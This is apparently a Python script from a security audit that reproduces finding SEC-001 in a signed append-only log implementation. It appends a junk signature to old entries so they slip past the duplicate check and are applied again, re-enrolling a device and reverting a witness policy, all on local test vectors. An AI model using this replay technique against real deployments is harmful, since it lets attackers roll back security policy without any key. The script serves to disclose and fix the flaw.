"""Reproduce SEC-001: an old signed entry, re-appended with one junk signature,
walks around `dup-entry` and is applied again.

Run from the repository root, with the reference implementation's venv:

    contrib/norn-ref/.venv/bin/python docs/audit/repro/replay_junk_signature.py

Read-only: it replays the shipped vectors in memory and writes nothing. It
needs no key -- which is the finding. §5.1 keys the seen set on the entry's
raw bytes, and §5.2 ignores a signature that does not verify, so adding one
changes the bytes without invalidating anything.
"""
import json
import pathlib
import sys

sys.path.insert(0, "contrib/norn-ref")
from nornref import cbor, replay  # noqa: E402

VECTORS = pathlib.Path("testdata/vectors")


def main() -> int:
    manifest = json.loads((VECTORS / "log" / "manifest.json").read_text())
    names = [e["name"] for e in manifest["entries"]]
    raws = [(VECTORS / "log" / f"{n}.cbor").read_bytes() for n in names]
    anchor = replay.Anchor(bytes.fromhex(manifest["anchor"]["net"]),
                           bytes.fromhex(manifest["anchor"]["genesis_hash"]))

    def with_junk_signature(raw: bytes) -> bytes:
        env = cbor.decode(raw)
        junk = {"kid": "ffffffffffffffff", "role": "signer", "sig": bytes(64)}
        env["sigs"] = sorted(env["sigs"] + [junk], key=lambda s: s["kid"])
        return cbor.encode(env)

    base = replay.replay(anchor, raws)
    reapplied = []
    for i, entry in enumerate(manifest["entries"]):
        if i == 0 or entry["reason"]:
            continue
        exact = replay.replay(anchor, raws + [raws[i]])
        assert [r["reason"] for r in exact.rejected if r["index"] == len(raws)] == ["dup-entry"]
        st = replay.replay(anchor, raws + [with_junk_signature(raws[i])])
        if not [r for r in st.rejected if r["index"] == len(raws)]:
            reapplied.append(entry["name"])

    print(f"an exact copy of any entry is dup-entry; with one junk signature, "
          f"{len(reapplied)} of the fixture's accepted entries are applied again:")
    for name in reapplied:
        print("  ", name)

    spare = replay.replay(anchor, raws + [with_junk_signature(raws[names.index("37-enroll-spare")])])
    print(f"\n`spare` is {base.devices['spare']['status']}; after re-appending "
          f"37-enroll-spare it is {spare.devices['spare']['status']}")
    quorum = lambda st: next(l for l in st.policy.split("\n") if l.startswith("group"))
    downgraded = replay.replay(anchor, raws + [with_junk_signature(raws[names.index("28-policy")])])
    print(f"the witness policy is `{quorum(base)}`; after re-appending 28-policy "
          f"it is `{quorum(downgraded)}`")
    return 0 if reapplied else 1


if __name__ == "__main__":
    sys.exit(main())
